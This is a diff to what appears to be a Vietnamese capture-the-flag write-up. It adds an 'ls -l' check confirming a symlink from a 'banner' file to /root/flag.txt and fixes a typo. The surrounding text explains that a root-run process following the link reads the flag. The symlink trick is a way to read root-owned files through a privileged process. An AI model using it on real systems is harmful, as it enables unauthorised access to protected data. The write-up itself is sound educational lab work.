@@ -118,7 +118,17 @@ player@challenge:~$ ln -s /root/flag.txt home/player/banner
 ln -s /root/flag.txt banner
 ```
 
-Khi này sẽ khôgn còn tồn tại file `banner` tại thư mục `home/player` nữa mà thay vào đó là symlink dẫn đến `/root/flag.txt`
+Kiểm tra xem đã có symlink chưa
+
+```bash
+player@challenge:~$ ls -l
+ls -l
+total 4
+lrwxrwxrwx 1 player player 14 Jul 22 15:15 banner -> /root/flag.txt
+-rw-r--r-- 1 root   root   13 Feb  7  2024 text
+```
+
+Khi này sẽ không còn tồn tại file `banner` tại thư mục `home/player` nữa mà thay vào đó là symlink dẫn đến `/root/flag.txt`
 
 Vậy nên khi chạy `nc` thì nó sẽ gọi đến đường dẫn `home/player/banner`, nhưng vì là symlink nên sẽ nhảy đến `/root/flag.txt` và đọc dưới quyền root
 
